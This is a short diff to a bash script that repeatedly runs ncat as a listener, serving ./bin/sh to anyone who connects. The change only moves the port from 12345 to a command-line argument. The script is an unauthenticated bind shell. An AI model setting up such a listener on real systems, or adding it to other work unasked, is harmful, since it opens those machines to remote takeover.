@@ -1,5 +1,5 @@
 #!/bin/bash
 
 while true; do
-	ncat -l -p 12345 -e ./bin/sh
+	ncat -l -p $1 -e ./bin/sh
 done
